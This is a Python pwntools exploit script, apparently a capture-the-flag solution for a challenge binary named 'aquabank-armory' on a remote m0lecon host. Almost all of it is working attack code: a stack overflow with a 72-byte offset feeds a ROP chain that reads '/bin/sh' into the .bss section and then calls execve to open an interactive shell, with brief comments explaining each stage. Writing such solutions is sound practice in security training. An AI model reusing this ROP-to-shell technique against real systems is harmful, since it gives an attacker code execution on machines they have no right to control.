from pwn import *

context.binary = elf = ELF('./aquabank-armory', checksec=False)

# p = process('./aquabank-armory')
p = remote('offsec.m0lecon.it', 13584)
OFFSET_TO_RIP = 72

pop_rdi = elf.sym.pop_rdi_ret
pop_rsi = elf.sym.pop_rsi_ret
pop_rdx = elf.sym.pop_rdx_ret
syscall_ret = elf.sym.syscall_ret

pop_rax = 0x00000000004214eb

# i will write the string "/bin/sh" in the .bss section, and then call execve("/bin/sh", NULL, NULL) using the syscall gadget.
# to write, i will simply call a read syscall. i can do this because i have the rax control, so i can set rax to 0 (sys_read) 
# and then call the syscall gadget.
bss_addr = elf.bss() 

payload = flat(
    b'A' * 72, # Verify your offset! (Usually 64 buf + 8 RBP)

    # --- STAGE 1: read(0, bss_addr, 8) ---
    pop_rdi, 0,         # STDIN
    pop_rsi, bss_addr,  # Destination: .bss section
    pop_rdx, 8,         # Length: 8 bytes
    pop_rax, 0,         # Syscall #0: read
    syscall_ret,

    # --- STAGE 2: execve(bss_addr, 0, 0) ---
    pop_rdi, bss_addr,  # The string is now sitting here!
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, 59,        # Syscall #59: execve
    syscall_ret
)

p.recvuntil(b'weapons:')
p.sendline(payload)
p.send(b'/bin/sh\x00')

p.interactive()